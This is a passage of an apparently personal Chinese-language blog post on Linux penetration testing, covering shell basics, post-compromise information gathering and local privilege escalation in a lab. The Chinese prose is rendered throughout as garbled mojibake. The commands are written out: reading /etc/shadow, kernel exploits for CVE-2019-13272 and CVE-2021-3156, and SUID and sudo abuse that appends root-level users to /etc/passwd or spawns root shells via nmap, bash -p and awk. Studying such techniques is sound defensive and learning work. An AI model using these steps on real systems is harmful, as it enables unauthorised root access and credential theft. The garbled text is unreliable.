class="hljs-string">-f å¼ºåˆ¶åˆ é™¤æ–‡ä»¶</span><br><span class="hljs-attr">rm</span> <span class="hljs-string">-r é€’å½’åˆ é™¤ç›®å½•</span><br><span class="hljs-attr">mkdir</span> <span class="hljs-string">åˆ›å»ºç›®å½•</span><br><span class="hljs-attr">rmdir</span> <span class="hljs-string">åˆ é™¤ç›®å½•</span><br><br><span class="hljs-attr">cp</span> <span class="hljs-string">filename path/filename å¤åˆ¶æ–‡ä»¶</span><br><span class="hljs-attr">mv</span> <span class="hljs-string">filename path/filename ç§»åŠ¨æ–‡ä»¶</span><br><br><span class="hljs-attr">pwd</span> <span class="hljs-string">æ˜¾ç¤ºå½“å‰ä½ç½®</span><br><span class="hljs-attr">cd</span> <span class="hljs-string">åˆ‡æ¢æ–‡ä»¶è·¯åŠ²</span><br><br><span class="hljs-meta">vim/vi</span>  <span class="hljs-string">æ–‡ä»¶ç¼–è¾‘</span><br><br><span class="hljs-meta">æ–‡ä»¶æƒé™ï¼šr</span> <span class="hljs-string">å¯è¯» 4   w å¯å†™ 2   x å¯æ‰§è¡Œ  1</span><br><span class="hljs-attr">rwx</span> = <span class="hljs-string">4+2+1 =7</span><br><span class="hljs-meta">drwxr-xr-x</span> <span class="hljs-string">1 kali kali  4096 Jul 19 15:36 1</span><br><span class="hljs-meta">-rw-r--r--</span> <span class="hljs-string">1 kali kali     0 Jul 19 15:36 2</span><br><span class="hljs-meta">ç¬¬ä¸€ä½ï¼šdä»£è¡¨æ–‡ä»¶å¤¹</span> <span class="hljs-string">-ä»£è¡¨æ–‡ä»¶</span><br><span class="hljs-attr">ç¬¬ä¸€æ®µï¼šä»£è¡¨æ‹¥æœ‰è€…çš„æƒé™</span><br><span class="hljs-attr">ç¬¬äºŒæ®µï¼šæ‹¥æœ‰è€…æ‰€åœ¨ç»„çš„ç»„å‘˜æƒé™</span><br><span class="hljs-attr">ç¬¬ä¸‰æ®µï¼šå…¶ä»–ç”¨æˆ·çš„æƒé™</span><br><span class="hljs-meta">*</span> <span class="hljs-string">ä¸‰ä½ä¸ºä¸€æ®µ</span><br><span class="hljs-attr">chmod</span> <span class="hljs-string">æ›´æ”¹æ–‡ä»¶æƒé™</span><br><span class="hljs-attr">chmod</span> <span class="hljs-string">777 file è®¾ç½®æ–‡ä»¶æ‰€æœ‰äººéƒ½å¯ä»¥è¯»å†™</span><br><span class="hljs-attr">chown</span> <span class="hljs-string">ä¿®æ”¹æ–‡ä»¶æ‹¥æœ‰è€…æƒé™ï¼ˆä¸€èˆ¬åªæœ‰rootç”¨æˆ·æœ‰è¿™ä¸ªæ“ä½œæƒé™ï¼‰</span><br><br><span class="hljs-attr">tar</span> <span class="hljs-string">æ‰“åŒ…å¹¶å‹ç¼©æ–‡ä»¶</span><br><span class="hljs-attr">tar</span> <span class="hljs-string">-zcvf filename.tar demon.txt å‹ç¼©æ–‡ä»¶</span><br>    <span class="hljs-attr">tar</span> <span class="hljs-string">-zxvf filename.tar è§£å‹æ–‡ä»¶</span><br></code></pre></td></tr></table></figure><h5 id="è¿›ç¨‹ç®¡ç†"><a href="#è¿›ç¨‹ç®¡ç†" class="headerlink" title="è¿›ç¨‹ç®¡ç†"></a>è¿›ç¨‹ç®¡ç†</h5><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">ps</span> <span class="hljs-string">æ˜¾ç¤ºç³»ç»Ÿè¿è¡Œè¿›ç¨‹</span><br><span class="hljs-attr">pstree</span> <span class="hljs-string">æ˜¾ç¤ºè¿›ç¨‹æ ‘</span><br><span class="hljs-attr">pstree</span> <span class="hljs-string">-aup æ˜¾ç¤ºå½“å‰ç³»ç»Ÿçš„è¿›ç¨‹æ ‘</span><br><span class="hljs-attr">top</span> <span class="hljs-string">é»˜è®¤æŒ‰ç…§cupçš„å ç”¨æƒ…å†µï¼Œæ˜¾ç¤ºè¿›ç¨‹</span><br><span class="hljs-attr">kill</span> <span class="hljs-string">ç»ˆæ­¢è¿›ç¨‹ kill -l PID</span><br><span class="hljs-attr">killall</span> <span class="hljs-string">æ€æ­»åŒä¸€è¿›ç¨‹ç»„å†…çš„æ‰€æœ‰è¿›ç¨‹ killall taskname</span><br></code></pre></td></tr></table></figure><h5 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h5><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">é‡å®šå‘ç¬¦ &gt;<br>ç®¡é“ç¬¦  <span class="hljs-string">|</span><br></code></pre></td></tr></table></figure><blockquote><p>ç›®å‰åªè®°å¾—è¿™äº›ï¼ŒåæœŸå†ç»§ç»­æ›´æ–°</p></blockquote><h4 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs awk">é‡è¦ï¼š<br>ipconfig æŸ¥çœ‹IPåœ°å€<br>netstat -ano æŸ¥çœ‹ç«¯å£ä¿¡æ¯<br>whoami å½“å‰ç”¨æˆ·ï¼ˆæŸ¥è¯¢å½“å‰ç”¨æˆ·æƒé™ï¼‰<br>id å½“å‰ç”¨æˆ·çš„æƒé™å’Œæ‰€åœ¨çš„ç®¡ç†ç»„<br>uname -a æŸ¥çœ‹å†…æ ¸ç‰ˆæœ¬ï¼ˆæ–¹ä¾¿åæœŸåˆ©ç”¨å†…æ ¸æ¼æ´ææƒï¼‰<br>ps/top å½“å‰è¿›ç¨‹<br>cat <span class="hljs-regexp">/proc/</span><span class="hljs-number">1</span>/cgroup åˆ¤æ–­æ˜¯å¦æ˜¯dockerå®¹å™¨<br>åŸç†ï¼šå®¹å™¨æ˜¯é€šè¿‡cgroupæ¥å®ç°èµ„æºé™åˆ¶ï¼Œåˆ¤æ–­å®¹å™¨æ˜¯å¦åœ¨ä¸€ä¸ªcgroupç»„ä¸­<br>æ˜¾ç¤ºç»“æœå¾ˆé•¿çš„å°±åŸºæœ¬å¯ä»¥åˆ¤æ–­ä¸ºdocker<br><br>ä¸»è¦ï¼š<br><span class="hljs-regexp">/etc/</span>network/interfaces æŸ¥çœ‹ç½‘å¡é…ç½®<br>cat <span class="hljs-regexp">/proc/</span>version æŸ¥çœ‹å†…æ ¸ä¿¡æ¯<br>cat <span class="hljs-regexp">/etc/</span>*release æŸ¥çœ‹linuxå‘è¡Œä¿¡æ¯<br>hostname æ‰“å°ä¸»æœºå<br>iptables -L æŸ¥çœ‹é˜²ç«å¢™é…ç½®ï¼ˆéœ€è¦rootï¼‰<br>cat <span class="hljs-regexp">/etc/</span>apache2/apache2.conf apacheé…ç½®æ–‡ä»¶<br>cat <span class="hljs-regexp">/etc/my</span>.conf  mysqlé…ç½®æ–‡ä»¶<br>cat <span class="hljs-regexp">/etc/</span>shadow æŸ¥çœ‹è´¦æˆ·å¯†ç ä¿¡æ¯ï¼ˆrootæƒé™ï¼‰<br>cat <span class="hljs-regexp">/etc/</span>passwd æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯<br>cat <span class="hljs-regexp">/etc/g</span>roup æŸ¥çœ‹ç”¨æˆ·ç»„ä¿¡æ¯<br>æŸ¥çœ‹.bash_historyæ–‡ä»¶ æŸ¥çœ‹æŒ‡ä»¤å†å²è®°å½•<br>æŸ¥çœ‹.mysql_historyæ–‡ä»¶ æŸ¥çœ‹mysqlæ“ä½œè®°å½•<br>æŸ¥çœ‹ç³»ç»Ÿæ—¥å¿—ï¼š<span class="hljs-regexp">/var/</span>log<br>æŸ¥çœ‹ç™»å½•æ—¥å¿—ï¼šw  who lastlog<br><br>æ¬¡è¦ï¼š<br>dpkg -l æŸ¥çœ‹å®‰è£…çš„è½¯ä»¶åŒ…<br>crontab -l æŸ¥çœ‹æ˜¯å¦æœ‰è®¡åˆ’ä»»åŠ¡<br>cat <span class="hljs-regexp">/etc/</span>rc.d<span class="hljs-regexp">/init.d/</span>  å¼€æœºå¯åŠ¨é¡¹<br>cat <span class="hljs-regexp">/etc/</span>shells  æŸ¥çœ‹å¯ä»¥ç”¨shell<br>env  æ‰“å°ç³»ç»Ÿç¯å¢ƒä¿¡æ¯<br>cat <span class="hljs-regexp">/proc/</span>cpuinfo  æŸ¥çœ‹cpuä¿¡æ¯<br>* /proc ç›®å½•å¾ˆé‡è¦ï¼Œéœ€è¦æ³¨æ„<br></code></pre></td></tr></table></figure><blockquote><p>æ„Ÿè§‰Linuxçš„å†…ç½‘æ¸—é€æ¯”è¾ƒå°‘è§ï¼Œæ”¶é›†çš„ä¿¡æ¯ä¹Ÿç›¸æ¯”äºwindowsè¦å°‘ä¸€äº›</p></blockquote><h4 id="ææƒæ‰‹æ³•"><a href="#ææƒæ‰‹æ³•" class="headerlink" title="ææƒæ‰‹æ³•"></a>ææƒæ‰‹æ³•</h4><h5 id="å†…æ ¸æ¼æ´ææƒ"><a href="#å†…æ ¸æ¼æ´ææƒ" class="headerlink" title="å†…æ ¸æ¼æ´ææƒ"></a>å†…æ ¸æ¼æ´ææƒ</h5><blockquote><p>ææƒåŸç†åå‘äºLinuxå†…æ ¸ï¼Œæ²¡æ¥è§¦è¿‡è¿™ä¸ªæ–¹å‘ï¼Œçœ‹æ¥ä¸€ä¸‹ç½‘ä¸Šæ–‡ç« ï¼Œä¸å¤ªèƒ½çœ‹æ‡‚ã€‚</p><p><a href="https://www.cnblogs.com/R4v3n/articles/9227723.html">https://www.cnblogs.com/R4v3n/articles/9227723.html</a></p></blockquote><p>å…ˆæ”¶é›†å†…æ ¸ç‰ˆæœ¬ä¿¡æ¯ï¼Œç„¶åç›´æ¥åˆ©ç”¨å·¥å…·ææƒï¼ˆå½“ä¸ªè„šæœ¬å°å­æŒºå¥½çš„ï¼‰ï¼Œè¿™å‡ ä¸ªå·¥å…·åˆ©ç”¨èµ·æ¥æ„Ÿè§‰æ•ˆæœä¸å¥½ã€‚</p><ol><li><code>searchsploit</code></li><li><a href="https://github.com/mzet-/linux-exploit-suggester%EF%BC%88%E8%BF%99%E4%B8%AA%E5%B7%A5%E5%85%B7%E5%8F%AF%E4%BB%A5%E5%A4%A7%E8%87%B4%E6%A3%80%E6%B5%8B%E4%B8%80%E4%BA%9BLinux%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8%E7%9A%84%E6%BC%8F%E6%B4%9E%EF%BC%89">https://github.com/mzet-/linux-exploit-suggesterï¼ˆè¿™ä¸ªå·¥å…·å¯ä»¥å¤§è‡´æ£€æµ‹ä¸€äº›Linuxå¯èƒ½å­˜åœ¨çš„æ¼æ´ï¼‰</a></li><li><a href="https://github.com/jondonas/linux-exploit-suggester-2%EF%BC%88%E4%BD%BF%E7%94%A8%E7%9A%84perl%E8%AF%AD%E8%A8%80%EF%BC%8C%E4%B8%8D%E4%B8%80%E5%AE%9A%E6%AF%8F%E4%B8%AA%E4%B8%BB%E6%9C%BA%E9%83%BD%E8%83%BD%E6%89%A7%E8%A1%8C%EF%BC%89">https://github.com/jondonas/linux-exploit-suggester-2ï¼ˆä½¿ç”¨çš„perlè¯­è¨€ï¼Œä¸ä¸€å®šæ¯ä¸ªä¸»æœºéƒ½èƒ½æ‰§è¡Œï¼‰</a></li></ol><blockquote><p>å†…æ ¸ææƒä¸€èˆ¬æ˜¯ä½œä¸ºæœ€åé€‰é¡¹ï¼Œå› ä¸ºexpæ‰§è¡Œåè¿œç¨‹ä¸»æœºå¯èƒ½ä¼šå´©æºƒï¼Œè®¸å¤šå…¬å¼€å¯ç”¨çš„ææƒæ¼æ´å¹¶ä¸æ˜¯å¾ˆç¨³å®šï¼Œç›®æ ‡ä¸»æœºä¹Ÿå¯èƒ½åœ¨ä½ å¾—åˆ°rootæƒé™åç›´æ¥å´©æºƒï¼Œå¹¶ä¸”æ¼æ´åˆ©ç”¨å¯èƒ½ä¼šç•™ä¸‹å¯¼è‡´è¢«æ•è·çš„ç—•è¿¹/æ—¥å¿—ã€‚</p></blockquote><h6 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h6><p>æ¼æ´ç¯å¢ƒï¼šubuntu16.04    Linux Kernel 4.15</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720103606519.png" alt="image-20210720103606519"></p><p>é¦–å…ˆä½¿ç”¨å·¥å…·æ£€æµ‹ä¸€ä¸‹å¯èƒ½å­˜åœ¨çš„ææƒæ¼æ´</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720103951085.png" alt="image-20210720103951085"></p><p><strong>CVE-2019-13272</strong>ï¼ˆè¯¥æ¼æ´åˆ©ç”¨å‰æ:éœ€è¦ç›®æ ‡æœåŠ¡å™¨æœ‰æ¡Œé¢ç¯å¢ƒï¼‰</p><p><a href="https://0x20h.com/p/fe4f#pkexec">https://0x20h.com/p/fe4f#pkexec</a></p><p>æ¼æ´å½±å“ç‰ˆæœ¬ï¼šLinux Kernel &lt; 5.1.17</p><p>â€¦â€¦â€¦â€¦ä¸Šé¢å·¥å…·æ²¡æœ‰æ£€æµ‹å‡ºè¿™ä¸ªæ¼æ´ï¼Œè¿™é‡Œå°è¯•ç›´æ¥åˆ©ç”¨è¿™ä¸ªæ¼æ´</p><p><a href="https://github.com/bcoles/kernel-exploits">https://github.com/bcoles/kernel-exploits</a> ä¸‹è½½EXP</p><p>ç¼–è¯‘cæ–‡ä»¶ï¼Œå¹¶ä¸”éœ€è¦èµ‹äºˆå¯æ‰§è¡Œæƒé™</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720104648771.png" alt="image-20210720104648771"></p><p>ç›´æ¥æ‰§è¡Œï¼Œè·å–åˆ°rootæƒé™</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720104735795.png" alt="image-20210720104735795"></p><blockquote><p>è¿™ä¸ªå¤ç°è¿‡ç¨‹å¾ˆç®€å•ï¼Œä½†æ˜¯åŸç†å¾ˆéš¾ï¼Œè¿™ä¸ªCVEç”±äºéœ€è¦ç›®æ ‡ä¸»æœºæ˜¯æ¡Œé¢ç‰ˆæ‰€ä»¥å¹³æ—¶çš„ç”¨å¤„ä¸å¤§ã€‚</p></blockquote><p><strong>CVE-2021-33909</strong></p><p>å½±å“èŒƒå›´ï¼šLinux kernel 3.16 - 5.13.x</p><blockquote><p>æš‚æ— EXPï¼ŒææƒèŒƒå›´æŒºå¹¿çš„</p></blockquote><h5 id="åˆ©ç”¨SUIDææƒ"><a href="#åˆ©ç”¨SUIDææƒ" class="headerlink" title="åˆ©ç”¨SUIDææƒ"></a>åˆ©ç”¨SUIDææƒ</h5><p>å‚è€ƒæ–‡ç« ï¼š</p><p><a href="https://jlkl.github.io/2020/01/27/Web_15/">https://jlkl.github.io/2020/01/27/Web_15/</a></p><p>SUIDæ˜¯ä¸€ç§ç‰¹æ®Šçš„æƒé™ï¼Œå¯ä»¥è®©è°ƒç”¨è€…åœ¨æ‰§è¡Œçš„è¿‡ç¨‹ä¸­æš‚æ—¶è·å¾—è¯¥æ–‡ä»¶çš„æ‹¥æœ‰è€…çš„æƒé™ã€‚å¦‚æœæ‰¾åˆ°rootç”¨æˆ·æ‹¥æœ‰çš„SUIDæ–‡ä»¶å¹¶è¿è¡Œï¼Œå°±å¯ä»¥æš‚æ—¶è·å–åˆ°rootç”¨æˆ·çš„æƒé™</p><p>æŸ¥æ‰¾å…·æœ‰SUIDæƒé™ä½å¹¶ä¸”å±ä¸rootçš„æ–‡ä»¶</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">find</span> / -user root -perm -4000 -<span class="hljs-builtin-name">print</span> 2&gt;/dev/<span class="hljs-literal">null</span><br><span class="hljs-builtin-name">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span><br><span class="hljs-builtin-name">find</span> / -user root -perm -4000 -exec ls -ldb &#123;&#125; ;<br>â€¦â€¦â€¦<br></code></pre></td></tr></table></figure><p>å¸¸è§å¯ä»¥ç”¨æ¥ææƒçš„å‘½ä»¤</p><ol><li><code>nmap</code></li><li><code>find</code></li><li><code>vim</code></li><li><code>bash</code></li><li><code>nano</code></li><li><code>cp/mv</code></li><li><code>more/less</code></li><li><code>awk</code></li><li><code>apt</code></li><li>â€¦â€¦â€¦â€¦</li></ol><p><strong>nampææƒ</strong></p><p> åœ¨<code>nmap 5.20</code>ä»¥å‰å­˜åœ¨<code>interactive</code>äº¤äº’æ¨¡å¼ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªäº¤äº’æ¨¡å¼ææƒ</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">nmap</span> <span class="hljs-string">--interactive</span><br><span class="hljs-comment">!sh</span><br></code></pre></td></tr></table></figure><p><a href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html">https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html</a></p><p>Pç¥é‡Œé¢å¯¹æ–°çš„<code>nmap</code>ææƒåšäº†æ·±å…¥çš„è§£é‡Šï¼Œç®€å•å†™ä¸€ä¸‹æˆ‘çš„ç†è§£</p><p>SUIDææƒä¸»è¦è¿˜æ˜¯çµæ´»åˆ©ç”¨äº†å¯¹äºæ™®é€šç”¨æˆ·å½“å‰è¿è¡Œå‘½ä»¤æ—¶çš„<code>Effective UID</code>ï¼Œåªæœ‰è¿™ä¸ªç¨‹åºçš„æ‰€æœ‰è€…æ˜¯0å·æˆ–å…¶ä»–super userï¼ŒåŒæ—¶æ‹¥æœ‰<code>suid</code>æƒé™ï¼Œæ‰å¯ä»¥ææƒã€‚<code>nmap</code>å…·æœ‰äº†<code>suid</code>æ—¶å’Œå…¶ä»–å‘½ä»¤å…·æœ‰<code>suid</code>æ˜¯æœ‰åŒºåˆ«çš„ã€‚</p><p>æ–°ç‰ˆçš„<code>nmap</code>æ²¡æœ‰äº†<code>interactive</code>äº¤äº’æ¨¡å¼ï¼Œå¹¶ä¸”éšç€Linuxæ–°ç‰ˆæœ¬çš„æ›´æ–°ç ”ç©¶äººå‘˜ä¹Ÿå¯¹<code>suid</code>ææƒåšäº†é™åˆ¶ã€‚è¿™é‡Œé‡‡ç”¨äº†æ–°çš„æ–¹æ³•æ¥ä½¿ç”¨<code>nmap</code>ææƒï¼Œæ·»åŠ ç”¨æˆ·</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">local file = io.open(<span class="hljs-string">&quot;/etc/passwd&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>)<br>file:write(<span class="hljs-string">&quot;root2::0:0::/root:/bin/bash\n&quot;</span>)<br>file:close()<br></code></pre></td></tr></table></figure><p>ä¸º<code>nmap</code>èµ‹äºˆ<code>root</code>ç”¨æˆ·çš„<code>suid</code>æƒé™</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720170143300.png" alt="image-20210720170143300"></p><p>æ‰§è¡Œä¸Šé¢çš„è„šæœ¬ï¼ŒæˆåŠŸæ·»åŠ äº†ä¸€ä¸ªrootç”¨æˆ·ï¼Œç›´æ¥åˆ‡æ¢ç”¨æˆ·è·å–åˆ°æƒé™</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720170302762.png" alt="image-20210720170302762"></p><p><strong>findææƒ</strong></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720140111241.png" alt="image-20210720140111241"></p><p>æŸ¥è¯¢åˆ°<code>find</code> å…·æœ‰<code>suid</code>æƒé™ï¼Œè¿›è¡Œ<code>find</code>ææƒ</p><p>å…ˆåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œä¸­é€”å€Ÿç”¨è¿™ä¸ªæ–‡ä»¶æ¥æ‰§è¡Œå‘½ä»¤</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720140532708.png" alt="image-20210720140532708"></p><p>æˆåŠŸæå‡äº†æƒé™</p><p><strong>bash</strong></p><p><code>bash -p</code> å¼€å¯ä¸€ä¸ªæ–°çš„shellï¼Œå¦‚æœæ˜¯suidçš„è¯å°±æ˜¯è·å–åˆ°rootçš„shell</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720142200911.png" alt="image-20210720142200911"></p><p>æ‰§è¡Œå‘½ä»¤è·å–æƒé™</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720142318447.png" alt="image-20210720142318447"></p><p><strong>cp / mv</strong></p><p>è¦†ç›–<code>/etc/shadow</code> æˆ–è€… <code>/etc/passwd</code></p><blockquote><p>éœ€è¦å°å¿ƒä¸€ç‚¹ï¼Œå‘½ä»¤ä¸è¦å¼„é”™äº†ä¸ç„¶å®¹æ˜“æ”¹å´©ç”¨æˆ·</p></blockquote><p>æŸ¥çœ‹å…·æœ‰SUIDæƒé™çš„å‘½ä»¤</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720152342842.png" alt="image-20210720152342842"></p><p>ä¼ªé€ ç”¨æˆ·</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs elixir">lcdm123<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>cat /etc/passwd &gt; passwd  å°†æ–‡ä»¶å¤åˆ¶å‡ºæ¥<br>lcdm123<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>openssl passwd <span class="hljs-number">-1</span> -salt hack hack123  ä¼ªé€ å¯†ç <br>lcdm123<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>echo <span class="hljs-string">&#x27;hack:$1$hack$WTn0dk2QjNeKfl.DHOUue0:0:0::/root/:/bin/bash&#x27;</span> &gt;&gt; passwd å¯†ç å†™å…¥å¤åˆ¶æ–‡ä»¶<br>lcdm123<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>cp passwd /etc/passwd  ä¿®æ”¹æ­£å¸¸çš„passwdæ–‡ä»¶<br>lcdm123<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>su - hack å¡«å…¥å¯†ç å³å¯<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720152752202.png" alt="image-20210720152752202"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720152821108.png" alt="image-20210720152821108"></p><p><code>mv</code>åŒç†ç±»ä¼¼</p><p><strong>vim vi nanoç­‰ç¼–è¾‘å™¨</strong></p><p>å¯ä»¥ç›´æ¥é€‰æ‹©å†™å…¥ä¸€ä¸ª<code>root</code>æƒé™ç”¨æˆ·ï¼Œä¸ç”¨ç½‘ä¸Šé‚£ç§èŠ±é‡Œèƒ¡å“¨çš„æ–¹æ³•ï¼Œç½‘ä¸Šçš„æäº†åŠå¤©ä¹Ÿæ²¡æœ‰æˆåŠŸ</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720173740391.png" alt="image-20210720173740391"></p><p><strong>less/more</strong></p><blockquote><p>æš‚æ—¶æ²¡æœ‰æˆåŠŸè·å¾—æƒé™</p></blockquote><p><strong>awk</strong></p><p><code>awk</code>æ˜¯ä¸€ç§å¤„ç†æ–‡ä»¶çš„è¯­è¨€ï¼Œæ˜¯æ–‡æœ¬åˆ†æå·¥å…·</p><p> ææƒå‘½ä»¤ï¼š<code>awk &#39;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#39;</code></p><blockquote><p>ç¯å¢ƒæ²¡æœ‰æ­å»ºå¥½ï¼Œæš‚æ—¶æ²¡æœ‰æˆåŠŸ</p></blockquote><p><strong>æ€»ç»“</strong></p><p>ä¸ªäººæ„Ÿè§‰<code>suid</code>ææƒï¼Œä¸»è¦æ˜¯ç½‘ç«™ç®¡ç†äººå‘˜çš„ç–å¿½ï¼Œä½¿ç”¨è¿™ä¸ªæ–¹æ³•åªèƒ½çœ‹è¿æ°”ï¼Œå¹³æ—¶å¤šç§¯ç´¯ä¸€ç‚¹å„ç§å‘½ä»¤ææƒçš„æ–¹æ³•</p><h5 id="SUDOææƒ"><a href="#SUDOææƒ" class="headerlink" title="SUDOææƒ"></a>SUDOææƒ</h5><ol><li><p><code>sudo</code>æ— å¯†ç ï¼Œå¯ä»¥æŸ¥çœ‹<code>/etc/sudoers</code>æˆ–è€…ä½¿ç”¨<code>sudo -l</code>æ¥æŸ¥çœ‹</p><blockquote><p>ç»è¿‡å¤šæ¬¡ç»ƒä¹ ï¼Œå‘ç°sudoææƒè¿˜æ˜¯å¾ˆæœ‰ç”¨çš„</p></blockquote><p>æ¡ˆä¾‹</p><p><code>sudo -l</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210818142203251.png" alt="image-20210818142203251"></p><p>æ‰§è¡Œå‘½ä»¤<code>sudo apt changelog apt</code>ææƒ</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210818142004907.png" alt="image-20210818142004907"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210818142230467.png" alt="image-20210818142230467"></p></li><li><p>CVE-2021-3156</p><p>æ¼æ´åŸå› ï¼šå½“<code>sudo</code>é€šè¿‡<code>-s</code>æˆ–è€…<code>-i</code>å‘½ä»¤è¡Œé€‰é¡¹åœ¨shellæ¨¡å¼ä¸‹è¿è¡Œå‘½ä»¤æ˜¯ï¼Œå®ƒä¼šæŠŠå‘½ä»¤å‚æ•°ä¸­ä½¿ç”¨åæ–œæ è½¬ä¹‰ç‰¹æ®Šå­—ç¬¦ï¼Œä½†æ˜¯ä½¿ç”¨<code>-s</code>æˆ–è€…<code>-i</code>æ ‡å¿—è¿è¡Œsudoeditæ—¶ï¼Œå®é™…ä¸Šå¹¶æ²¡æœ‰è¿›è¡Œè½¬ä¹‰ï¼Œä»è€Œå¯¼è‡´äº†ç¼“å†²åŒºæº¢å‡ºæ¼æ´ï¼Œåªè¦å­˜åœ¨sudoersæ–‡ï¼ˆ/etc/sudoersï¼‰ï¼Œå°±å¯ä»¥ææƒäº†ã€‚</p><p>å½±å“ç‰ˆæœ¬ï¼š<code>sudo 1.8.2-1.8.31p2   1.9.0-1.9.5p1</code></p><p>æ¼æ´æ£€æµ‹ï¼š<code>sudo --verison</code> æŸ¥çœ‹ç‰ˆæœ¬</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210721095440738.png" alt="image-20210721095440738"></p><p>åˆ©ç”¨expæ¥ææƒï¼š<a href="https://github.com/blasty/CVE-2021-3156%EF%BC%8C%E6%B2%A1%E6%9C%89%E5%8F%91%E7%8E%B0%E9%80%82%E5%90%88ubuntu16.04%E7%89%88%E6%9C%AC%E7%B3%BB%E7%BB%9F%E7%9A%84exp%EF%BC%8C%E6%89%80%E4%BB%A5%E4%BD%BF%E7%94%A818.04%E7%89%88%E6%9C%AC%E6%9D%A5%E6%B5%8B%E8%AF%95%E3%80%82">https://github.com/blasty/CVE-2021-3156ï¼Œæ²¡æœ‰å‘ç°é€‚åˆubuntu16.04ç‰ˆæœ¬ç³»ç»Ÿçš„expï¼Œæ‰€ä»¥ä½¿ç”¨18.04ç‰ˆæœ¬æ¥æµ‹è¯•ã€‚</a></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210721102908854.png" alt="image-20210721102908854"></p><p>å…ˆmakeï¼Œç„¶åæ‰§è¡Œæ–‡ä»¶ï¼Œé€‰æ‹©ç›¸åº”çš„ç³»ç»Ÿå³å¯ï¼ˆè¿™é‡Œæä¾›çš„é€‰æ‹©æ¯”è¾ƒå°‘ï¼Œä¹Ÿæ²¡æœ‰æ‰¾åˆ°å…¶ä»–åˆé€‚çš„expï¼‰</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210721104615754.png" alt="image-20210721104615754"></p></li></ol><blockquote><p><del>æ„Ÿè§‰SUDOææƒæ²¡æœ‰SUIDææƒèˆ’æœ</del></p></blockquote><h5 id="è®¡åˆ’ä»»åŠ¡ææƒ"><a href="#è®¡åˆ’ä»»åŠ¡ææƒ" class="headerlink" 